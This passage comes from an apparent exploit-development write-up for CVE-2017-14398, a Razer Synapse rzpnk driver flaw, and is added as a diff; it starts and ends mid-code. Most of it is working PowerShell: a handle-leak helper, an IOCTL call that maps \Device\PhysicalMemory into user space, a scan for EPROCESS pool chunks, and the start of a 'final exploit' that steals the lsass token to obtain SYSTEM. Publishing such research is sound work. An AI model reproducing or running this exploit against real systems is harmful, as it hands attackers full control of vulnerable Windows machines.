+					0x0B = 'DebugObject'; 0x0C = 'Event'; 0x0D = 'EventPair'; 0x0E = 'Mutant'; 0x0F = 'Callback';
+					0x10 = 'Semaphore'; 0x11 = 'Timer'; 0x12 = 'IRTimer'; 0x13 = 'Profile'; 0x14 = 'KeyedEvent';
+					0x15 = 'WindowStation'; 0x16 = 'Desktop'; 0x17 = 'CompositionSurface'; 0x18 = 'TpWorkerFactory';
+					0x19 = 'Adapter'; 0x1A = 'Controller'; 0x1B = 'Device'; 0x1C = 'Driver'; 0x1D = 'IoCompletion';
+					0x1E = 'WaitCompletionPacket'; 0x1F = 'File'; 0x20 = 'TmTm'; 0x21 = 'TmTx'; 0x22 = 'TmRm';
+					0x23 = 'TmEn'; 0x24 = 'Section'; 0x25 = 'Session'; 0x26 = 'Key'; 0x27 = 'ALPC Port';
+					0x28 = 'PowerRequest'; 0x29 = 'WmiGuid'; 0x2A = 'EtwRegistration'; 0x2B = 'EtwConsumer';
+					0x2C = 'FilterConnectionPort'; 0x2D = 'FilterCommunicationPort'; 0x2E = 'PcwObject';
+					0x2F = 'DxgkSharedResource'; 0x30 = 'DxgkSharedSyncObject';
+				}
+			}
+		
+			'6.1' # Windows 7 and Window Server 2008 R2
+			{
+				$TypeSwitches = @{
+					0x02 = 'Type'; 0x03 = 'Directory'; 0x04 = 'SymbolicLink'; 0x05 = 'Token'; 0x06 = 'Job';
+					0x07 = 'Process'; 0x08 = 'Thread'; 0x09 = 'UserApcReserve'; 0x0a = 'IoCompletionReserve';
+					0x0b = 'DebugObject'; 0x0c = 'Event'; 0x0d = 'EventPair'; 0x0e = 'Mutant'; 0x0f = 'Callback';
+					0x10 = 'Semaphore'; 0x11 = 'Timer'; 0x12 = 'Profile'; 0x13 = 'KeyedEvent'; 0x14 = 'WindowStation';
+					0x15 = 'Desktop'; 0x16 = 'TpWorkerFactory'; 0x17 = 'Adapter'; 0x18 = 'Controller';
+					0x19 = 'Device'; 0x1a = 'Driver'; 0x1b = 'IoCompletion'; 0x1c = 'File'; 0x1d = 'TmTm';
+					0x1e = 'TmTx'; 0x1f = 'TmRm'; 0x20 = 'TmEn'; 0x21 = 'Section'; 0x22 = 'Session'; 0x23 = 'Key';
+					0x24 = 'ALPC Port'; 0x25 = 'PowerRequest'; 0x26 = 'WmiGuid'; 0x27 = 'EtwRegistration';
+					0x28 = 'EtwConsumer'; 0x29 = 'FilterConnectionPort'; 0x2a = 'FilterCommunicationPort';
+					0x2b = 'PcwObject';
+				}
+			}
+		
+			'6.0' # Windows Vista and Windows Server 2008
+			{
+				$TypeSwitches = @{
+					0x01 = 'Type'; 0x02 = 'Directory'; 0x03 = 'SymbolicLink'; 0x04 = 'Token'; 0x05 = 'Job';
+					0x06 = 'Process'; 0x07 = 'Thread'; 0x08 = 'DebugObject'; 0x09 = 'Event'; 0x0a = 'EventPair';
+					0x0b = 'Mutant'; 0x0c = 'Callback'; 0x0d = 'Semaphore'; 0x0e = 'Timer'; 0x0f = 'Profile';
+					0x10 = 'KeyedEvent'; 0x11 = 'WindowStation'; 0x12 = 'Desktop'; 0x13 = 'TpWorkerFactory';
+					0x14 = 'Adapter'; 0x15 = 'Controller'; 0x16 = 'Device'; 0x17 = 'Driver'; 0x18 = 'IoCompletion';
+					0x19 = 'File'; 0x1a = 'TmTm'; 0x1b = 'TmTx'; 0x1c = 'TmRm'; 0x1d = 'TmEn'; 0x1e = 'Section';
+					0x1f = 'Session'; 0x20 = 'Key'; 0x21 = 'ALPC Port'; 0x22 = 'WmiGuid'; 0x23 = 'EtwRegistration';
+					0x24 = 'FilterConnectionPort'; 0x25 = 'FilterCommunicationPort';
+				}
+			}
+		}
+	
+		[int]$BuffPtr_Size = 0
+		while ($true) {
+			[IntPtr]$BuffPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BuffPtr_Size)
+			$SystemInformationLength = New-Object Int
+		
+			$CallResult = [GetHandles]::NtQuerySystemInformation(16, $BuffPtr, $BuffPtr_Size, [ref]$SystemInformationLength)
+			
+			# STATUS_INFO_LENGTH_MISMATCH
+			if ($CallResult -eq 0xC0000004) {
+				[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
+				[int]$BuffPtr_Size = [System.Math]::Max($BuffPtr_Size,$SystemInformationLength)
+			}
+			# STATUS_SUCCESS
+			elseif ($CallResult -eq 0x00000000) {
+				break
+			}
+			# Probably: 0xC0000005 -> STATUS_ACCESS_VIOLATION
+			else {
+				[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
+				return
+			}
+		}
+		
+		$SYSTEM_HANDLE_INFORMATION = New-Object SYSTEM_HANDLE_INFORMATION
+		$SYSTEM_HANDLE_INFORMATION = $SYSTEM_HANDLE_INFORMATION.GetType()
+		if ([System.IntPtr]::Size -eq 4) {
+			$SYSTEM_HANDLE_INFORMATION_Size = 16 # This makes sense!
+		} else {
+			$SYSTEM_HANDLE_INFORMATION_Size = 24 # This doesn't make sense, should be 20 on x64 but that doesn't work.
+												# Ask no questions, hear no lies!
+		}
+		
+		$BuffOffset = $BuffPtr.ToInt64()
+		$HandleCount = [System.Runtime.InteropServices.Marshal]::ReadInt32($BuffOffset)
+		$BuffOffset = $BuffOffset + [System.IntPtr]::Size
+		
+		$SystemHandleArray = @()
+		for ($i=0; $i -lt $HandleCount; $i++){
+			# PtrToStructure only objects we are targeting, this is expensive computation
+			if ([System.Runtime.InteropServices.Marshal]::ReadInt32($BuffOffset) -eq $ProcID) {
+				$SystemPointer = New-Object System.Intptr -ArgumentList $BuffOffset
+				$Cast = [system.runtime.interopservices.marshal]::PtrToStructure($SystemPointer,[type]$SYSTEM_HANDLE_INFORMATION)
+				
+				$HashTable = @{
+					PID = $Cast.ProcessID
+					ObjectType = if (!$($TypeSwitches[[int]$Cast.ObjectTypeNumber])) { "0x$('{0:X2}' -f [int]$Cast.ObjectTypeNumber)" } else { $TypeSwitches[[int]$Cast.ObjectTypeNumber] }
+					HandleFlags = $FlagSwitches[[int]$Cast.Flags]
+					Handle = "0x$('{0:X4}' -f [int]$Cast.HandleValue)"
+					KernelPointer = if ([System.IntPtr]::Size -eq 4) { "0x$('{0:X}' -f $Cast.Object_Pointer.ToInt32())" } else { "0x$('{0:X}' -f $Cast.Object_Pointer.ToInt64())" }
+					AccessMask = "0x$('{0:X8}' -f $($Cast.GrantedAccess -band 0xFFFF0000))"
+				}
+				
+				$Object = New-Object PSObject -Property $HashTable
+				$SystemHandleArray += $Object
+				
+			}
+	
+			$BuffOffset = $BuffOffset + $SYSTEM_HANDLE_INFORMATION_Size
+		}
+		
+		if ($($SystemHandleArray.count) -eq 0) {
+			[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
+			Return
+		}
+		
+		# Set column order and auto size
+		$SystemHandleArray
+		
+		# Free SYSTEM_HANDLE_INFORMATION array
+		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
+	}
+
+	#----------------[Get Driver Handle]
+	
+	$hDevice = [Razer]::CreateFile("\\.\47CD78C9-64C3-47C2-B80F-677B887CF095", [System.IO.FileAccess]::ReadWrite,
+	[System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
+	
+	if ($hDevice -eq -1) {
+		echo "`n[!] Unable to get driver handle..`n"
+		Return
+	} else {
+		echo "`n[>] Driver access OK.."
+		echo "[+] lpFileName: \\.\47CD78C9-64C3-47C2-B80F-677B887CF095 => rzpnk"
+		echo "[+] Handle: $hDevice"
+	}
+	
+	#----------------[Prepare buffer & Send IOCTL]
+	
+	# Get full access process handle to self
+	echo "`n[>] Opening full access handle to PowerShell.."
+	$hPoshProc = [Razer]::OpenProcess(0x001F0FFF,$false,$PID)
+	echo "[+] PowerShell handle: $hPoshProc"
+	
+	# Get Section handle
+	echo "`n[>] Leaking Kernel handle to \Device\PhysicalMemory.."
+	$SystemProcHandles = Get-Handles -ProcID 4
+	[Int]$UserSectionHandle = $(($SystemProcHandles |Where-Object {$_.ObjectType -eq "Section"}).Handle)
+	[Int64]$SystemSectionHandle = $UserSectionHandle + 0xffffffff80000000
+	echo "[+] System section handle: $('{0:X}' -f $SystemSectionHandle)"
+	
+	# NTSTATUS ZwMapViewOfSection(
+	#   _In_        HANDLE          SectionHandle,      | Param 3 - RCX = SectionHandle
+	#   _In_        HANDLE          ProcessHandle,      | Param 1 - RDX = ProcessHandle
+	#   _Inout_     PVOID           *BaseAddress,       | Param 2 - R8  = BaseAddress -> Irrelevant, ptr to NULL
+	#   _In_        ULONG_PTR       ZeroBits,           | 0 -> OK - R9
+	#   _In_        SIZE_T          CommitSize,         | Param 5 - CommitSize / ViewSize
+	#   _Inout_opt_ PLARGE_INTEGER  SectionOffset,      | 0 -> OK
+	#   _Inout_     PSIZE_T         ViewSize,           | Param 5 - CommitSize / ViewSize
+	#   _In_        SECTION_INHERIT InheritDisposition, | 2 = ViewUnmap
+	#   _In_        ULONG           AllocationType,     | 0 -> Undocumented?
+	#   _In_        ULONG           Win32Protect        | 0x40 -> PAGE_READWRITE
+	# );
+	$InBuffer = @(
+		[System.BitConverter]::GetBytes($hPoshProc.ToInt64()) +      # Param 1 - RDX=ProcessHandle
+		[System.BitConverter]::GetBytes([Int64]0x0) +                # Param 2 - BaseAddress -> Irrelevant, ptr to NULL
+		[System.BitConverter]::GetBytes($SystemSectionHandle) +      # Param 3 - RCX=SectionHandle
+		[System.BitConverter]::GetBytes([Int64]4) +                  # Param 4 - ? junk ?
+		[System.BitConverter]::GetBytes([Int64]$(1*1024*1024)) +     # Param 5 - CommitSize / ViewSize (1mb)
+		[System.BitConverter]::GetBytes([Int64]4)                    # Param 6 - ? junk ?
+	)
+	
+	# Output buffer
+	$OutBuffer = [Razer]::VirtualAlloc([System.IntPtr]::Zero, 1024, 0x3000, 0x40)
+	
+	# Ptr receiving output byte count
+	$IntRet = 0
+	
+	#=======
+	# 0x22a050 - ZwOpenProcess
+	# 0x22A064 - ZwMapViewOfSection
+	#=======
+	$CallResult = [Razer]::DeviceIoControl($hDevice, 0x22A064, $InBuffer, $InBuffer.Length, $OutBuffer, 1024, [ref]$IntRet, [System.IntPtr]::Zero)
+	if (!$CallResult) {
+		echo "`n[!] DeviceIoControl failed..`n"
+		Return
+	}
+	
+	#----------------[Read out the result buffer]
+	echo "`n[>] Verifying ZwMapViewOfSection.."
+	$NTSTATUS = "{0:X}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()+8+8+8+8+8))
+	$Address = [System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()+8+8+8)
+	if ($NTSTATUS -eq 0) {
+		echo "[+] NTSTATUS Success!"
+		echo "[+] 1mb RWX \Device\PhysicalMemory allocated at: $('{0:X}' -f $Address)`n"
+	} else {
+		echo "[!] Call failed: $('{0:X}' -f $NTSTATUS)`n"
+	}
+}</pre>
+</div>
+
+<p>Running our new POC, we get the following output.</p>
+
+<p>&nbsp;</p>
+<img src="images/Logic_10.png">
+<p>&nbsp;</p>
+
+<p>Notice that we are measuring success by reading the NTSTATUS code and that the Int64 which was previously 0 now returns the address, in our local process, where the section was mapped. Looking in Process Hacker we can see a nice innocuous memory allocation of exactly 1024kb.</p>
+
+<p>&nbsp;</p>
+<img src="images/Logic_11.png">
+<p>&nbsp;</p>
+
+<p>Using Process Hacker we can actually save that memory chunk do disk. If we do that and kind of scroll through, we can see some humorous stuff as show below. Bootkit anyone?</p>
+
+<p>&nbsp;</p>
+<img src="images/Logic_12.png">
+<p>&nbsp;</p>
+
+<p>We pretty much proved the vulnerability, but how do we get a SYSTEM shell now?<br /><br />
+
+<span style="color: #ffffff;"><strong>Hunting EPROCESS</strong></span><br /><br />
+
+The most straight-forward way we can exploit this is by doing a classic token stealing attack. The difficulty is finding the EPROCESS structure in our mapped memory. Some poking around in WinDBG shows that the EPROCESS structure is allocated in a 'Proc' pool chunk.</p>
+
+<p>&nbsp;</p>
+<img src="images/Logic_13.png">
+<p>&nbsp;</p>
+
+<p>By subtracting the start of the 'Proc' pool chunk from the EPROCESS pointer we also immediately get the header size. Conversely, if we have an arbitrary 'Proc' pool address we can calculate the location of any property in the EPROCESS structure.</p>
+
+<p>&nbsp;</p>
+<img src="images/Logic_14.png">
+<p>&nbsp;</p>
+
+<p>If you want to look up these architecture/version dependent offsets without jumping into KD you can use the <a href="http://terminus.rewolf.pl/terminus/">Terminus Project</a>. This is a great resource by <a href="https://twitter.com/rwfpl">@rwfpl</a> which has saved me a lot of time on a quite few occasions!<br /><br />
+
+So we effectively reduced our problem to finding 'Proc' pool chunks, not exactly a win yet. To find these chunks we can scan the mapped section for the unique 'Proc' pool tag.</p>
+
+<p>&nbsp;</p>
+<img src="images/Logic_15.png">
+<p>&nbsp;</p>
+
+<p>As a matter of optimization notice that the pool chunks are aligned to a 10 hex boundary. Essentially, that means we only need to read a single DWORD every 16 bytes. This doesn't seem like much but it saves us precious time. Even so the searching was very very slow as 'Proc' pool chunks started showing up after ~900mb. To further optimize the search we can start scanning the mapped memory at an offset of 0x30000000 (0x30000000/(1024*1024) = 768mb) leaving enough variance for different OS versions.<br /><br />
+
+To test the theory we can use the following loop (on a 1.2gb mapped section) to find 'Proc' pool chunks and dump out some EPROCESS data for confirmation.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+echo "`n[>] Parsing physical memory, coffee time..`n"
+for ($i=0x30000000;$i -lt $(1200*1024*1024); $i+=0x10) {
+	
+	# Read potential pooltag
+	$Val = [System.Runtime.InteropServices.Marshal]::ReadInt32($Address+$i+4)
+	
+	# If pooltag matches Proc, pull out details..
+	if ($Val -eq 0xe36f7250) {
+		echo "[+] w00t Proc chunk found!"
+		$ProcessName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($Address+$i+0x60+0x2d8+8) # Not sure why +8 here?
+		$Token = [System.Runtime.InteropServices.Marshal]::ReadInt64($Address+$i+0x60+0x208)
+		$ProcID = [System.Runtime.InteropServices.Marshal]::ReadInt64($Address+$i+0x60+0x180)
+		echo "[>] Address: $('{0:X}' -f $($Address+$i))"
+		echo "[>] $ProcessName"
+		echo "[>] $ProcID"
+		echo "[>] Token: $('{0:X}' -f $Token)"
+		echo "==========================================="
+	}
+}</pre>
+</div>
+
+<p>A portion of the result is shown below.</p>
+
+<p>&nbsp;</p>
+<img src="images/Logic_16.png">
+<p>&nbsp;</p>
+
+<p>As you can see, this implementation is not perfect, some image names are truncated and a small amount of detections don't appear to be EPROCESS structures at all. Luckily I found that most of processes were guaranteed to be detected correctly (including PowerShell/lsass).</p>
+
+<h2 class="title">Game Over<span class="line"></span></h2>
+<p>All that remains is to modify the loop above slightly so it records the lsass token and the location of the PowerShell token. Once both elements are found we can simply overwrite the PowerShell token and elevate to SYSTEM! While some experimentation may be required, porting this exploit to 8,8.1,10 should be a fairly straight-forward exercise. The only considerations would be changes in the EPROCESS structure and developing a strategy to deal with multiple section handles in the System process. The final exploit is shown below.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+function RZ-ZwMapViewOfSection {
+	Add-Type -TypeDefinition @"
+	using System;
+	using System.Diagnostics;
+	using System.Runtime.InteropServices;
+	using System.Security.Principal;
+	
+	public static class Razer
+	{
+		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+		public static extern IntPtr CreateFile(
+			String lpFileName,
+			UInt32 dwDesiredAccess,
+			UInt32 dwShareMode,
+			IntPtr lpSecurityAttributes,
+			UInt32 dwCreationDisposition,
+			UInt32 dwFlagsAndAttributes,
+			IntPtr hTemplateFile);
+	
+		[DllImport("Kernel32.dll", SetLastError = true)]
+		public static extern bool DeviceIoControl(
+			IntPtr hDevice,
+			int IoControlCode,
+			byte[] InBuffer,
+			int nInBufferSize,
+			IntPtr OutBuffer,
+			int nOutBufferSize,
+			ref int pBytesReturned,
+			IntPtr Overlapped);
+	
+		[DllImport("kernel32.dll", SetLastError = true)]
+		public static extern IntPtr VirtualAlloc(
+			IntPtr lpAddress,
+			uint dwSize,
+			UInt32 flAllocationType,
+			UInt32 flProtect);
+	
+		[DllImport("kernel32.dll")]
+		public static extern IntPtr OpenProcess(
+			UInt32 processAccess,
+			bool bInheritHandle,
+			int processId);
+	}
+"@
+
+	#----------------[Helper Funcs]
+	$CVE201714398 = @"
+
+                    shhsddh 
+          shhy      Mhsdms  
+         mmyydN     hNh     
+        hM syyMdds   smNy   
+shyshy  Nd s sMshNs  yssmm      Razer Synapse EOP - CVE-2017-14398
+ shhdh hNs   dNNNddmdsd yMs
+    sddds   mhydNmddmdmddy
+           dMdhy                            [by b33f -> @FuzzySec]
+          dNsyyss           
+          smmdddmmmddmh        
+                   yhmh
+                   hdd      
+                    yd      
+"@
+
+	$CVE201714398
+
+	#----------------[Helper Funcs]
+	function Get-Handles {
+	<#
+	.SYNOPSIS
+		Use NtQuerySystemInformation::SystemHandleInformation to get a list of
+		open handles in the specified process, works on x32/x64.
+		Notes:
+	
+		* For more robust coding I would recomend using @mattifestation's
+		Get-NtSystemInformation.ps1 part of PowerShellArsenal.
+	
+	.DESCRIPTION
+		Author: Ruben Boonen (@FuzzySec)
+		License: BSD 3-Clause
+		Required Dependencies: None
+		Optional Dependencies: None
+	
+	.EXAMPLE
+		C:\PS> $SystemProcHandles = Get-Handles -ProcID 4
+		C:\PS> $Key = $SystemProcHandles |Where-Object {$_.ObjectType -eq "Key"}
+		C:\PS> $Key |ft
+	
+		ObjectType AccessMask PID Handle HandleFlags KernelPointer
+		---------- ---------- --- ------ ----------- -------------
+		Key        0x00000000   4 0x004C NONE        0xFFFFC9076FC29BC0
+		Key        0x00020000   4 0x0054 NONE        0xFFFFC9076FCDA7F0
+		Key        0x000F0000   4 0x0058 NONE        0xFFFFC9076FC39CE0
+		Key        0x00000000   4 0x0090 NONE        0xFFFFC907700A6B40
+		Key        0x00000000   4 0x0098 NONE        0xFFFFC90770029F70
+		Key        0x00020000   4 0x00A0 NONE        0xFFFFC9076FC9C1A0
+		[...Snip...]
+	#>
+	
+		[CmdletBinding()]
+		param (
+			[Parameter(Mandatory = $True)]
+			[int]$ProcID
+		)
+		
+		Add-Type -TypeDefinition @"
+		using System;
+		using System.Diagnostics;
+		using System.Runtime.InteropServices;
+		using System.Security.Principal;
+		
+		[StructLayout(LayoutKind.Sequential, Pack = 1)]
+		public struct SYSTEM_HANDLE_INFORMATION
+		{
+			public UInt32 ProcessID;
+			public Byte ObjectTypeNumber;
+			public Byte Flags;
+			public UInt16 HandleValue;
+			public IntPtr Object_Pointer;
+			public UInt32 GrantedAccess;
+		}
+		
+		public static class GetHandles
+		{
+			[DllImport("ntdll.dll")]
+			public static extern int NtQuerySystemInformation(
+				int SystemInformationClass,
+				IntPtr SystemInformation,
+				int SystemInformationLength,
+				ref int ReturnLength);
+		}
+"@
+	
+		# Make sure the PID exists
+		if (!$(get-process -Id $ProcID -ErrorAction SilentlyContinue)) {
+			Return
+		}
+	
+		# Flag switches (0 = NONE?)
+		$FlagSwitches = @{
+			0 = 'NONE'
+			1 = 'PROTECT_FROM_CLOSE'
+			2 = 'INHERIT'
+		}
+		
+		$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
+		$OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
+		switch ($OSMajorMinor)
+		{
+			'10.0' # Windows 10 (Tested on v1511)
+			{
+				# Win 10 v1703
+				if ($OSVersion.Build -ge 15063) {
+					$TypeSwitches = @{
+						0x24 = 'TmTm'; 0x18 = 'Desktop'; 0x7 = 'Process'; 0x2c = 'RegistryTransaction'; 0xe = 'DebugObject';
+						0x3d = 'VRegConfigurationContext'; 0x34 = 'DmaDomain'; 0x1c = 'TpWorkerFactory'; 0x1d = 'Adapter';
+						0x5 = 'Token'; 0x39 = 'DxgkSharedResource'; 0xc = 'PsSiloContextPaged'; 0x38 = 'NdisCmState';
+						0xb = 'ActivityReference'; 0x35 = 'PcwObject'; 0x2f = 'WmiGuid'; 0x33 = 'DmaAdapter';
+						0x30 = 'EtwRegistration'; 0x29 = 'Session'; 0x1a = 'RawInputManager'; 0x13 = 'Timer'; 0x10 = 'Mutant';
+						0x14 = 'IRTimer'; 0x3c = 'DxgkCurrentDxgProcessObject'; 0x21 = 'IoCompletion';
+						0x3a = 'DxgkSharedSyncObject'; 0x17 = 'WindowStation'; 0x15 = 'Profile'; 0x23 = 'File';
+						0x2a = 'Partition'; 0x12 = 'Semaphore'; 0xd = 'PsSiloContextNonPaged'; 0x32 = 'EtwConsumer';
+						0x19 = 'Composition'; 0x31 = 'EtwSessionDemuxEntry'; 0x1b = 'CoreMessaging'; 0x25 = 'TmTx';
+						0x4 = 'SymbolicLink'; 0x36 = 'FilterConnectionPort'; 0x2b = 'Key'; 0x16 = 'KeyedEvent';
+						0x11 = 'Callback'; 0x22 = 'WaitCompletionPacket'; 0x9 = 'UserApcReserve'; 0x6 = 'Job';
+						0x3b = 'DxgkSharedSwapChainObject'; 0x1e = 'Controller'; 0xa = 'IoCompletionReserve'; 0x1f = 'Device';
+						0x3 = 'Directory'; 0x28 = 'Section'; 0x27 = 'TmEn'; 0x8 = 'Thread'; 0x2 = 'Type';
+						0x37 = 'FilterCommunicationPort'; 0x2e = 'PowerRequest'; 0x26 = 'TmRm'; 0xf = 'Event';
+						0x2d = 'ALPC Port'; 0x20 = 'Driver';
+					}
+				}
+				
+				# Win 10 v1607
+				if ($OSVersion.Build -ge 14393 -And $OSVersion.Build -lt 15063) {
+					$TypeSwitches = @{
+						0x23 = 'TmTm'; 0x17 = 'Desktop'; 0x7 = 'Process'; 0x2b = 'RegistryTransaction'; 0xd = 'DebugObject';
+						0x3a = 'VRegConfigurationContext'; 0x32 = 'DmaDomain'; 0x1b = 'TpWorkerFactory'; 0x1c = 'Adapter';
+						0x5 = 'Token'; 0x37 = 'DxgkSharedResource'; 0xb = 'PsSiloContextPaged'; 0x36 = 'NdisCmState';
+						0x33 = 'PcwObject'; 0x2e = 'WmiGuid'; 0x31 = 'DmaAdapter'; 0x2f = 'EtwRegistration';
+						0x28 = 'Session'; 0x19 = 'RawInputManager'; 0x12 = 'Timer'; 0xf = 'Mutant'; 0x13 = 'IRTimer';
+						0x20 = 'IoCompletion'; 0x38 = 'DxgkSharedSyncObject'; 0x16 = 'WindowStation'; 0x14 = 'Profile';
+						0x22 = 'File'; 0x3b = 'VirtualKey'; 0x29 = 'Partition'; 0x11 = 'Semaphore'; 0xc = 'PsSiloContextNonPaged';
+						0x30 = 'EtwConsumer'; 0x18 = 'Composition'; 0x1a = 'CoreMessaging'; 0x24 = 'TmTx'; 0x4 = 'SymbolicLink';
+						0x34 = 'FilterConnectionPort'; 0x2a = 'Key'; 0x15 = 'KeyedEvent'; 0x10 = 'Callback';
+						0x21 = 'WaitCompletionPacket'; 0x9 = 'UserApcReserve'; 0x6 = 'Job'; 0x39 = 'DxgkSharedSwapChainObject';
+						0x1d = 'Controller'; 0xa = 'IoCompletionReserve'; 0x1e = 'Device'; 0x3 = 'Directory'; 0x27 = 'Section';
+						0x26 = 'TmEn'; 0x8 = 'Thread'; 0x2 = 'Type'; 0x35 = 'FilterCommunicationPort'; 0x2d = 'PowerRequest';
+						0x25 = 'TmRm'; 0xe = 'Event'; 0x2c = 'ALPC Port'; 0x1f = 'Driver';
+					}
+				}
+				
+				# Win 10 v1511
+				if ($OSVersion.Build -lt 14393) {
+					$TypeSwitches = @{
+						0x02 = 'Type'; 0x03 = 'Directory'; 0x04 = 'SymbolicLink'; 0x05 = 'Token'; 0x06 = 'Job';
+						0x07 = 'Process'; 0x08 = 'Thread'; 0x09 = 'UserApcReserve'; 0x0A = 'IoCompletionReserve';
+						0x0B = 'DebugObject'; 0x0C = 'Event'; 0x0D = 'Mutant'; 0x0E = 'Callback'; 0x0F = 'Semaphore';
+						0x10 = 'Timer'; 0x11 = 'IRTimer'; 0x12 = 'Profile'; 0x13 = 'KeyedEvent'; 0x14 = 'WindowStation';
+						0x15 = 'Desktop'; 0x16 = 'Composition'; 0x17 = 'RawInputManager'; 0x18 = 'TpWorkerFactory';
+						0x19 = 'Adapter'; 0x1A = 'Controller'; 0x1B = 'Device'; 0x1C = 'Driver'; 0x1D = 'IoCompletion';
+						0x1E = 'WaitCompletionPacket'; 0x1F = 'File'; 0x20 = 'TmTm'; 0x21 = 'TmTx'; 0x22 = 'TmRm';
+						0x23 = 'TmEn'; 0x24 = 'Section'; 0x25 = 'Session'; 0x26 = 'Partition'; 0x27 = 'Key';
+						0x28 = 'ALPC Port'; 0x29 = 'PowerRequest'; 0x2A = 'WmiGuid'; 0x2B = 'EtwRegistration';
+						0x2C = 'EtwConsumer'; 0x2D = 'DmaAdapter'; 0x2E = 'DmaDomain'; 0x2F = 'PcwObject';
+						0x30 = 'FilterConnectionPort'; 0x31 = 'FilterCommunicationPort'; 0x32 = 'NetworkNamespace';
+						0x33 = 'DxgkSharedResource'; 0x34 = 'DxgkSharedSyncObject'; 0x35 = 'DxgkSharedSwapChainObject';
+					}
+				}
+			}
+			
+			'6.2' # Windows 8 and Windows Server 2012
+			{
+				$TypeSwitches = @{
+					0x02 = 'Type'; 0x03 = 'Directory'; 0x04 = 'SymbolicLink'; 0x05 = 'Token'; 0x06 = 'Job';
+					0x07 = 'Process'; 0x08 = 'Thread'; 0x09 = 'UserApcReserve'; 0x0A = 'IoCompletionReserve';
+					0x0B = 'DebugObject'; 0x0C = 'Event'; 0x0D = 'EventPair'; 0x0E = 'Mutant'; 0x0F = 'Callback';
+					0x10 = 'Semaphore'; 0x11 = 'Timer'; 0x12 = 'IRTimer'; 0x13 = 'Profile'; 0x14 = 'KeyedEvent';
+					0x15 = 'WindowStation'; 0x16 = 'Desktop'; 0x17 = 'CompositionSurface'; 0x18 = 'TpWorkerFactory';
+					0x19 = 'Adapter'; 0x1A = 'Controller'; 0x1B = 'Device'; 0x1C = 'Driver'; 0x1D = 'IoCompletion';
+					0x1E = 'WaitCompletionPacket'; 0x1F = 'File'; 0x20 = 'TmTm'; 0x21 = 'TmTx'; 0x22 = 'TmRm';
+					0x23 = 'TmEn'; 0x24 = 'Section'; 0x25 = 'Session'; 0x26 = 'Key'; 0x27 = 'ALPC Port';
+					0x28 = 'PowerRequest'; 0x29 = 'WmiGuid'; 0x2A = 'EtwRegistration'; 0x2B = 'EtwConsumer';
+					0x2C = 'FilterConnectionPort'; 0x2D = 'FilterCommunicationPort'; 0x2E = 'PcwObject';
+					0x2F = 'DxgkSharedResource'; 0x30 = 'DxgkSharedSyncObject';
+				}
+			}
+		
+			'6.1' # Windows 7 and Window Server 2008 R2
+			{
+				$TypeSwitches = @{
+					0x02 = 'Type'; 0x03 = 'Directory'; 0x04 = 'SymbolicLink'; 0x05 = 'Token'; 0x06 = 'Job';
+					0x07 = 'Process'; 0x08 = 'Thread'; 0x09 = 'UserApcReserve'; 0x0a = 'IoCompletionReserve';
+					0x0b = 'DebugObject'; 0x0c = 'Event'; 0x0d = 'EventPair'; 0x0e = 'Mutant'; 0x0f = 'Callback';
+					0x10 = 'Semaphore'; 0x11 = 'Timer'; 0x12 = 'Profile'; 0x13 = 'KeyedEvent'; 0x14 = 'WindowStation';
+					0x15 = 'Desktop'; 0x16 = 'TpWorkerFactory'; 0x17 = 'Adapter'; 0x18 = 'Controller';
+					0x19 = 'Device'; 0x1a = 'Driver'; 0x1b = 'IoCompletion'; 0x1c = 'File'; 0x1d = 'TmTm';
+					0x1e = 'TmTx'; 0x1f = 'TmRm'; 0x20 = 'TmEn'; 0x21 = 'Section'; 0x22 = 'Session'; 0x23 = 'Key';
+					0x24 = 'ALPC Port'; 0x25 = 'PowerRequest'; 0x26 = 'WmiGuid'; 0x27 = 'EtwRegistration';
+					0x28 = 'EtwConsumer'; 0x29 = 'FilterConnectionPort'; 0x2a = 'FilterCommunicationPort';
+					0x2b = 'PcwObject';
+				}
+			}
+		
+			'6.0' # Windows Vista and Windows Server 2008
+			{
+				$TypeSwitches = @{
+					0x01 = 'Type'; 0x02 = 'Directory'; 0x03 = 'SymbolicLink'; 0x04 = 'Token'; 0x05 = 'Job';
+					0x06 = 'Process'; 0x07 = 'Thread'; 0x08 = 'DebugObject'; 0x09 = 'Event'; 0x0a = 'EventPair';
+					0x0b = 'Mutant'; 0x0c = 'Callback'; 0x0d = 'Semaphore'; 0x0e = 'Timer'; 0x0f = 'Profile';
+					0x10 = 'KeyedEvent'; 0x11 = 'WindowStation'; 0x12 = 'Desktop'; 0x13 = 'TpWorkerFactory';
+					0x14 = 'Adapter'; 0x15 = 'Controller'; 0x16 = 'Device'; 0x17 = 'Driver'; 0x18 = 'IoCompletion';
+					0x19 = 'File'; 0x1a = 'TmTm'; 0x1b = 'TmTx'; 0x1c = 'TmRm'; 0x1d = 'TmEn'; 0x1e = 'Section';
+					0x1f = 'Session'; 0x20 = 'Key'; 0x21 = 'ALPC Port'; 0x22 = 'WmiGuid'; 0x23 = 'EtwRegistration';
+					0x24 = 'FilterConnectionPort'; 0x25 = 'FilterCommunicationPort';
+				}
+			}
+		}
+	
+		[int]$BuffPtr_Size = 0
+		while ($true) {
+			[IntPtr]$BuffPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BuffPtr_Size)
+			$SystemInformationLength = New-Object Int
+		
+			$CallResult = [GetHandles]::NtQuerySystemInformation(16, $BuffPtr, $BuffPtr_Size, [ref]$SystemInformationLength)
+			
+			# STATUS_INFO_LENGTH_MISMATCH
+			if ($CallResult -eq 0xC0000004) {
+				[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
